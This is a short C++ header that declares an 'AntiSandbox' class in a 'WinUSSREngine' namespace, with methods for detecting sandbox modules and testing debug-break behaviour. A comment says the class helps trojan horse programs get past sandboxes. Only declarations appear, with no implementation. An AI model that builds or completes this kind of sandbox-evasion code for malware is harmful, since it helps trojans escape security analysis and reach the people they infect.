#pragma once


namespace WinUSSREngine
{
	// Aids in bypassing sandbox programs for trojan horse programs.
	class AntiSandbox
	{
	public:
		AntiSandbox();
		// The idea is that it looks for the module handle and then exits
		bool foundSandboxModules();
		bool canDebugbreak();
	};
}